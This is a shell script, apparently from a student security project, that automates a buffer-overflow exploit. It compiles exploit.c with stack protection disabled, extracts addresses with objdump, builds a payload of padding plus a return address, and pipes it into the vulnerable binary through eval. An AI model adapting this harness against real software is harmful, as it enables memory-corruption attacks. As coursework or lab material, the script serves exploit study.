#Shell script to call the various components of the project files
#Call the Zipfile.c
#Extract return address of exploit method using objdump
#Call the BufferOverflow.c
#Call the RED class file

SCRIPTNAME=$(basename $0)
function error_desc
{

#   ------------------------------------------------------------
#       Exit the script when fatal error is encountered
#       Input argument: The error desriptor as String
#   ------------------------------------------------------------
		
        echo "ERROR MESSAGE DESCRIPTION!!"
        echo "${SCRIPTNAME}: ${1:-"Unknown Error"}" 1>&2


        exit 1
}

# Call the error function with the Line env variable

#echo "ERROR MESSAGE DESCRIPTION!!"
#error_desc "$LINENO: ERROR HAS OCCURED..ABORTING"

#Execute the ZipFile Binary
#gcc hello_world.c

#   ------------------------------------------------------------
#       Complile the ZipFile and get the objdump for the hex
#		address into a text file.
#   ------------------------------------------------------------
gcc exploit.c -o exploit.o -fno-stack-protector -m32
objdump -d exploit.o > hexdump.txt


#   ------------------------------------------------------------
#       Execute the file compressor
#	
#   ------------------------------------------------------------
java -jar filecomp.jar > filename.txt

if [ "$?" = "0" ]; then
        echo "FINSIHED RUNNING COMPRESSOR & CREATED THE TEXT FILE."
else
        error_desc "$LINENO: ERROR HAS OCCURED..ABORTING"
fi

#   ------------------------------------------------------------
#       Create the payload
#	
#   ------------------------------------------------------------

echo "PayLoadPackager"
PAYLOAD=""
PAYLOAD=$(./payload hexdump.txt)
echo $PAYLOAD

P1="python -c 'print \"a\"*32 + \""
P1+=$PAYLOAD
P1+="\"' | ./exploit.o"
echo $P1
eval $P1 
if [ "$?" = "0" ]; then
        echo "FINSIHED CREATING PAYLOAD.."
else
        error_desc "$LINENO: ERROR HAS OCCURED..ABORTING"
fi

#   ------------------------------------------------------------
#       Create the payload
#	
#   ------------------------------------------------------------


